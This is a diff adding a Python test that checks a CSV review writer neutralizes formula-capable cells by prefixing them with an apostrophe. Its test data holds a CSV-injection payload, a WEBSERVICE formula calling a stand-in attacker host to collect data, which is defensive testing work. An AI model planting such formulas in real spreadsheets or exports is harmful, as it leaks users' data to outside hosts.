@@ -1,5 +1,6 @@
 from __future__ import annotations
 
+import csv
 import importlib.util
 import json
 import os
@@ -773,6 +774,29 @@ def test_review_writer_refuses_linked_outputs(tmp_path: Path) -> None:
         else:
             raise AssertionError(f"review writer followed a {kind}")
         assert victim.read_text(encoding="utf-8") == "preserve"
+
+
+def test_review_csv_neutralizes_formula_capable_cells(tmp_path: Path) -> None:
+    module = _load_module()
+    output = tmp_path / "formula.review.csv"
+    formula = '=WEBSERVICE("https://attacker.invalid/collect")'
+    whitespace_formula = " \t@SUM(1,1)"
+
+    module.write_csv(
+        output,
+        [
+            {
+                "prompt_id": formula,
+                "notes": whitespace_formula,
+            }
+        ],
+        ["prompt_id", "notes"],
+    )
+
+    with output.open(encoding="utf-8", newline="") as handle:
+        row = next(csv.DictReader(handle))
+    assert row["prompt_id"] == f"'{formula}"
+    assert row["notes"] == f"'{whitespace_formula}"
 
 
 def test_build_rewrite_tasks_keeps_expected_signals(tmp_path: Path) -> None:
